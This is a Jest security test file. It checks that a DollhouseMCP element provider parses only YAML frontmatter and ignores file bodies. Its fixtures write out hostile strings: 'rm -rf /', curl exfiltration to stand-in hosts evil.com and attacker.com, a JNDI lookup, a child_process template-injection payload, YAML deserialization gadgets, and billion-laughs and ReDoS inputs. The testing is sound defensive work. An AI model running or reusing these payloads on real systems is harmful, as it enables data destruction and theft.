/**
 * Security tests for metadata-based test detection
 * Verifies that content body is never read and buffer limits are enforced
 */

import { jest } from '@jest/globals';
import * as fs from 'fs/promises';
import * as path from 'path';
import * as os from 'os';
import { DefaultElementProvider } from '../../../src/portfolio/DefaultElementProvider.js';

describe('Metadata Detection Security Tests', () => {
  let tempDir: string;
  let provider: DefaultElementProvider;

  beforeEach(async () => {
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'metadata-security-test-'));
    provider = new DefaultElementProvider();
  });

  afterEach(async () => {
    await fs.rm(tempDir, { recursive: true, force: true });
    // CRITICAL MEMORY LEAK FIX: Clean up static caches to prevent memory accumulation
    DefaultElementProvider.cleanup();
  });

  describe('Buffer Limit Enforcement', () => {
    it('should only read first 4KB of file content', async () => {
      const testFile = path.join(tempDir, 'large-file.md');
      
      // Create frontmatter that fits in 4KB
      const frontmatter = `---
name: Security Test
_dollhouseMCPTest: true
_testMetadata:
  suite: security-test
  purpose: Testing buffer limits
---`;

      // Create large dangerous content after frontmatter (>10KB)
      const dangerousContent = `
# Dangerous Content
${'rm -rf / # '.repeat(1000)}
${'eval("malicious code") # '.repeat(1000)}
${'curl https://evil.com/steal-data # '.repeat(1000)}`;

      const fullContent = frontmatter + dangerousContent;
      await fs.writeFile(testFile, fullContent);

      // Verify file is large
      const stats = await fs.stat(testFile);
      expect(stats.size).toBeGreaterThan(4096);

      // Should still read metadata successfully
      const metadata = await (provider as any).readMetadataOnly(testFile);
      expect(metadata).toEqual({
        name: 'Security Test',
        _dollhouseMCPTest: true,
        _testMetadata: {
          suite: 'security-test',
          purpose: 'Testing buffer limits'
        }
      });

      // Should detect as test file
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);
      expect(isTest).toBe(true);
    });

    it('should handle frontmatter exactly at 4KB boundary', async () => {
      const testFile = path.join(tempDir, 'boundary-file.md');
      
      // Calculate space needed for exact 4KB frontmatter
      const baseContent = `---
name: Boundary Test
_dollhouseMCPTest: true
_testMetadata:
  suite: boundary-test
  purpose: Testing 4KB boundary
description: `;
      
      const closingContent = `
---
# Content after boundary`;
      
      // Fill to exactly 4KB minus base content and closing
      const paddingNeeded = 4096 - Buffer.byteLength(baseContent) - Buffer.byteLength(closingContent);
      const padding = 'x'.repeat(Math.max(0, paddingNeeded - 1)); // -1 for quote
      
      const content = baseContent + `"${padding}"` + closingContent;
      
      await fs.writeFile(testFile, content);

      // Should read metadata successfully
      const metadata = await (provider as any).readMetadataOnly(testFile);
      expect(metadata.name).toBe('Boundary Test');
      expect(metadata._dollhouseMCPTest).toBe(true);
    });

    it('should handle frontmatter that exceeds 4KB gracefully', async () => {
      const testFile = path.join(tempDir, 'oversized-frontmatter.md');
      
      // Create frontmatter larger than 4KB
      const largePadding = 'x'.repeat(5000);
      const content = `---
name: Oversized Test
description: "${largePadding}"
_dollhouseMCPTest: true
---
# This frontmatter is too large`;

      await fs.writeFile(testFile, content);

      // Should return null because frontmatter doesn't close within 4KB
      const metadata = await (provider as any).readMetadataOnly(testFile);
      expect(metadata).toBeNull();

      // Should not detect as test file
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);
      expect(isTest).toBe(false);
    });
  });

  describe('Malicious Content Protection', () => {
    it('should never read dangerous content in file body', async () => {
      const testFile = path.join(tempDir, 'malicious-body.md');
      
      const content = `---
name: Safe Metadata
_dollhouseMCPTest: false
version: 1.0.0
---
# Malicious Content Below
rm -rf /
curl https://attacker.com/steal?data=\${HOME}
eval(maliciousJavaScript())
exec("dangerous command")
import subprocess; subprocess.call(['rm', '-rf', '/'])
<script>alert('XSS')</script>
\${jndi:ldap://evil.com/exploit}
{{constructor.constructor('return process')().mainModule.require('child_process').exec('malicious')}}`;

      await fs.writeFile(testFile, content);

      // Should read only the safe metadata
      const metadata = await (provider as any).readMetadataOnly(testFile);
      expect(metadata).toEqual({
        name: 'Safe Metadata',
        _dollhouseMCPTest: false,
        version: '1.0.0'
      });

      // Should correctly identify as non-test
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);
      expect(isTest).toBe(false);

      // Verify dangerous content is not accessible through metadata
      expect(JSON.stringify(metadata)).not.toContain('rm -rf');
      expect(JSON.stringify(metadata)).not.toContain('curl');
      expect(JSON.stringify(metadata)).not.toContain('eval');
      expect(JSON.stringify(metadata)).not.toContain('exec');
      expect(JSON.stringify(metadata)).not.toContain('subprocess');
      expect(JSON.stringify(metadata)).not.toContain('script');
    });

    it('should handle malicious YAML in frontmatter safely', async () => {
      const testFile = path.join(tempDir, 'malicious-yaml.md');
      
      // Try various YAML injection attempts
      const maliciousContents = [
        // Python object injection
        `---
name: Python Injection
dangerous: !!python/object/apply:subprocess.call [['rm', '-rf', '/']]
_dollhouseMCPTest: true
---`,
        // JavaScript function injection
        `---
name: JS Injection
dangerous: !!js/function "function(){return process.exit(1)}"
_dollhouseMCPTest: true
---`,
        // Exec injection
        `---
name: Exec Injection
dangerous: !!python/object/apply:os.system ['rm -rf /']
_dollhouseMCPTest: true
---`,
        // Binary data injection
        `---
name: Binary Injection
dangerous: !!binary |
  SGVsbG8gV29ybGQ=
_dollhouseMCPTest: true
---`
      ];

      for (let i = 0; i < maliciousContents.length; i++) {
        const maliciousFile = path.join(tempDir, `malicious-${i}.md`);
        await fs.writeFile(maliciousFile, maliciousContents[i]);

        // Should handle malicious YAML gracefully (return null or sanitized data)
        const metadata = await (provider as any).readMetadataOnly(maliciousFile);
        
        if (metadata !== null) {
          // If parsed, should not contain dangerous functions
          expect(typeof metadata).toBe('object');
          expect(metadata.name).toBeDefined();
          
          // Should not contain function objects or dangerous types
          const metadataStr = JSON.stringify(metadata);
          expect(metadataStr).not.toContain('function');
          expect(metadataStr).not.toContain('subprocess');
          expect(metadataStr).not.toContain('os.system');
        }

        // Should not crash the detection process
        const isTest = await (provider as any).isDollhouseMCPTestElement(maliciousFile);
        expect(typeof isTest).toBe('boolean');
      }
    });

    it('should prevent ReDoS attacks with crafted YAML', async () => {
      const testFile = path.join(tempDir, 'redos-attack.md');
      
      // Create a YAML structure that could cause ReDoS
      const maliciousPattern = 'a'.repeat(1000) + 'X' + 'a'.repeat(1000);
      const content = `---
name: ReDoS Attack
pattern: "${maliciousPattern}"
_dollhouseMCPTest: true
---
# Content`;

      await fs.writeFile(testFile, content);

      // Should complete within reasonable time (not hang)
      const startTime = Date.now();
      
      const metadata = await (provider as any).readMetadataOnly(testFile);
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);
      
      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should complete within 1 second (very generous for ReDoS protection)
      expect(duration).toBeLessThan(1000);
      
      // Should still work functionally
      if (metadata) {
        expect(metadata.name).toBe('ReDoS Attack');
      }
      expect(typeof isTest).toBe('boolean');
    });

    it('should handle files with null bytes and binary data', async () => {
      const testFile = path.join(tempDir, 'binary-data.md');
      
      // Create content with null bytes and binary data
      const binaryContent = Buffer.from([
        ...Buffer.from('---\nname: Binary Test\n_dollhouseMCPTest: true\n---\n'),
        0x00, 0x01, 0x02, 0x03, // null bytes and binary
        ...Buffer.from('# Content with binary data'),
        0xFF, 0xFE, 0xFD, 0xFC
      ]);

      await fs.writeFile(testFile, binaryContent);

      // Should handle gracefully without crashing
      const metadata = await (provider as any).readMetadataOnly(testFile);
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);

      // Should either parse successfully or return null/false
      if (metadata) {
        expect(metadata.name).toBe('Binary Test');
        expect(metadata._dollhouseMCPTest).toBe(true);
      }
      expect(typeof isTest).toBe('boolean');
    });
  });

  describe('Resource Exhaustion Protection', () => {
    it('should handle many simultaneous file reads without memory leaks', async () => {
      const fileCount = 100;
      const files = [];

      // Create many test files
      for (let i = 0; i < fileCount; i++) {
        const filePath = path.join(tempDir, `concurrent-${i}.md`);
        const content = `---
name: Concurrent Test ${i}
_dollhouseMCPTest: ${i % 2 === 0}
_testMetadata:
  suite: concurrent-test
  purpose: Testing concurrent access
---
# Content ${i}`;

        await fs.writeFile(filePath, content);
        files.push(filePath);
      }

      // Monitor memory before
      if (global.gc) global.gc();
      const memoryBefore = process.memoryUsage().heapUsed;

      // Process all files concurrently
      const promises = files.map(async (filePath) => {
        const metadata = await (provider as any).readMetadataOnly(filePath);
        const isTest = await (provider as any).isDollhouseMCPTestElement(filePath);
        return { metadata, isTest };
      });

      const results = await Promise.all(promises);

      // Verify results
      expect(results).toHaveLength(fileCount);
      const testCount = results.filter(r => r.isTest).length;
      expect(testCount).toBe(fileCount / 2); // Every other file is a test

      // Check memory usage didn't grow excessively
      if (global.gc) global.gc();
      const memoryAfter = process.memoryUsage().heapUsed;
      const memoryGrowth = memoryAfter - memoryBefore;
      const memoryGrowthMB = memoryGrowth / 1024 / 1024;

      console.log(`Memory growth: ${memoryGrowthMB.toFixed(2)}MB for ${fileCount} files`);
      expect(memoryGrowthMB).toBeLessThan(50); // Should not grow more than 50MB
    }, 30000);

    it('should handle file descriptor limits gracefully', async () => {
      // Test opening many files in sequence
      const sequentialCount = 200;
      
      for (let i = 0; i < sequentialCount; i++) {
        const filePath = path.join(tempDir, `sequential-${i}.md`);
        const content = `---
name: Sequential ${i}
_dollhouseMCPTest: true
---
# Sequential ${i}`;

        await fs.writeFile(filePath, content);
        
        // Read metadata (which opens/closes file descriptor)
        const metadata = await (provider as any).readMetadataOnly(filePath);
        expect(metadata?.name).toBe(`Sequential ${i}`);
        
        // Small delay to avoid overwhelming the system
        if (i % 50 === 0) {
          await new Promise(resolve => setTimeout(resolve, 1));
        }
      }
    }, 60000);

    it('should handle very deep directory nesting', async () => {
      // Create deeply nested directory structure
      const deepPath = path.join(tempDir, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j');
      await fs.mkdir(deepPath, { recursive: true });

      const testFile = path.join(deepPath, 'deep-test.md');
      const content = `---
name: Deep Test
_dollhouseMCPTest: true
---
# Deep nesting test`;

      await fs.writeFile(testFile, content);

      // Should handle deep paths without issues
      const metadata = await (provider as any).readMetadataOnly(testFile);
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);

      expect(metadata?.name).toBe('Deep Test');
      expect(isTest).toBe(true);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should handle various encoding schemes', async () => {
      const encodingTests = [
        {
          name: 'utf8-bom.md',
          content: '\uFEFF---\nname: UTF8 BOM\n_dollhouseMCPTest: true\n---\n# UTF8 with BOM'
        },
        {
          name: 'latin1.md',
          content: Buffer.from('---\nname: Latin1 Test\n_dollhouseMCPTest: true\n---\n# Latin1 çontent', 'latin1')
        },
        {
          name: 'mixed-encoding.md',
          content: '---\nname: Mixed\n_dollhouseMCPTest: true\ndescription: "Åpfel café naïve"\n---\n# Mixed encoding'
        }
      ];

      for (const test of encodingTests) {
        const filePath = path.join(tempDir, test.name);
        
        if (Buffer.isBuffer(test.content)) {
          await fs.writeFile(filePath, test.content);
        } else {
          await fs.writeFile(filePath, test.content, 'utf8');
        }

        // Should handle different encodings gracefully
        const metadata = await (provider as any).readMetadataOnly(filePath);
        const isTest = await (provider as any).isDollhouseMCPTestElement(filePath);

        // Should either work or fail gracefully
        if (metadata) {
          expect(typeof metadata.name).toBe('string');
        }
        expect(typeof isTest).toBe('boolean');
      }
    });

    it('should validate metadata field types', async () => {
      const testFile = path.join(tempDir, 'type-validation.md');
      
      const content = `---
name: Type Validation
_dollhouseMCPTest: "true"  # String instead of boolean
version: 1.0.0
tags: not-an-array
nested:
  object: value
  _dollhouseMCPTest: true  # nested boolean
---
# Content`;

      await fs.writeFile(testFile, content);

      const metadata = await (provider as any).readMetadataOnly(testFile);
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);

      // Should parse but string "true" should not be treated as boolean true
      expect(metadata).toBeTruthy();
      expect(metadata._dollhouseMCPTest).toBe('true'); // String, not boolean
      expect(isTest).toBe(false); // Because it's not boolean true
    });

    it('should handle extremely long field values', async () => {
      const testFile = path.join(tempDir, 'long-fields.md');
      
      const longValue = 'x'.repeat(10000);
      const content = `---
name: "Long Fields Test"
longDescription: "${longValue}"
_dollhouseMCPTest: true
shortField: "normal"
---
# Content`;

      await fs.writeFile(testFile, content);

      const metadata = await (provider as any).readMetadataOnly(testFile);
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);

      // Should handle long values gracefully
      if (metadata) {
        expect(metadata.name).toBe('Long Fields Test');
        expect(metadata.shortField).toBe('normal');
        expect(isTest).toBe(true);
        
        if (metadata.longDescription) {
          expect(metadata.longDescription).toHaveLength(10000);
        }
      } else {
        // If metadata parsing failed due to size limits, that's also acceptable
        expect(isTest).toBe(false);
      }
    });

    it('should prevent YAML billion laughs attack', async () => {
      const testFile = path.join(tempDir, 'billion-laughs.md');
      
      // Simplified version of billion laughs attack
      const content = `---
name: Billion Laughs
a: &a "lol"
b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
_dollhouseMCPTest: true
---
# Content`;

      await fs.writeFile(testFile, content);

      // Should complete within reasonable time and memory
      const startTime = Date.now();
      const startMemory = process.memoryUsage().heapUsed;

      const metadata = await (provider as any).readMetadataOnly(testFile);
      const isTest = await (provider as any).isDollhouseMCPTestElement(testFile);

      const endTime = Date.now();
      const endMemory = process.memoryUsage().heapUsed;

      // Should complete quickly
      expect(endTime - startTime).toBeLessThan(1000);
      
      // Should not consume excessive memory
      expect(endMemory - startMemory).toBeLessThan(100 * 1024 * 1024); // 100MB limit

      // Should handle gracefully
      if (metadata) {
        expect(metadata.name).toBe('Billion Laughs');
      }
      expect(typeof isTest).toBe('boolean');
    });
  });

  describe('File System Security', () => {
    it('should handle permission denied errors gracefully', async () => {
      const protectedFile = path.join(tempDir, 'protected.md');
      
      const content = `---
name: Protected File
_dollhouseMCPTest: true
---
# Protected content`;

      await fs.writeFile(protectedFile, content);
      
      try {
        // Try to make file unreadable (may not work on all systems)
        await fs.chmod(protectedFile, 0o000);
        
        // Should handle permission errors gracefully
        const metadata = await (provider as any).readMetadataOnly(protectedFile);
        const isTest = await (provider as any).isDollhouseMCPTestElement(protectedFile);

        // Should return null/false rather than throwing
        expect(metadata).toBeNull();
        expect(isTest).toBe(false);
      } catch (error) {
        // If chmod didn't work (e.g., on Windows), that's ok
        console.log('Permission test skipped on this platform');
      } finally {
        // Restore permissions for cleanup
        try {
          await fs.chmod(protectedFile, 0o644);
        } catch {
          // Ignore cleanup errors
        }
      }
    });

    it('should handle symlink attacks', async () => {
      const symlinkFile = path.join(tempDir, 'symlink-test.md');
      const targetFile = path.join(tempDir, 'target.md');
      
      const content = `---
name: Symlink Target
_dollhouseMCPTest: true
---
# Symlink target`;

      await fs.writeFile(targetFile, content);
      
      try {
        // Create symlink
        await fs.symlink(targetFile, symlinkFile);
        
        // Should follow symlink safely
        const metadata = await (provider as any).readMetadataOnly(symlinkFile);
        const isTest = await (provider as any).isDollhouseMCPTestElement(symlinkFile);

        expect(metadata?.name).toBe('Symlink Target');
        expect(isTest).toBe(true);
      } catch (error) {
        // Symlinks might not be supported on all systems
        console.log('Symlink test skipped on this platform');
      }
    });

    it('should handle concurrent access to same file', async () => {
      const sharedFile = path.join(tempDir, 'shared.md');
      
      const content = `---
name: Shared File
_dollhouseMCPTest: true
_testMetadata:
  suite: concurrent-test
  purpose: Testing concurrent access
---
# Shared content`;

      await fs.writeFile(sharedFile, content);

      // Start multiple concurrent reads
      const concurrentReads = 20;
      const promises = Array.from({ length: concurrentReads }, async (_, i) => {
        const metadata = await (provider as any).readMetadataOnly(sharedFile);
        const isTest = await (provider as any).isDollhouseMCPTestElement(sharedFile);
        return { index: i, metadata, isTest };
      });

      const results = await Promise.all(promises);

      // All reads should succeed with same results
      expect(results).toHaveLength(concurrentReads);
      
      for (const result of results) {
        expect(result.metadata?.name).toBe('Shared File');
        expect(result.isTest).toBe(true);
      }
    });
  });
});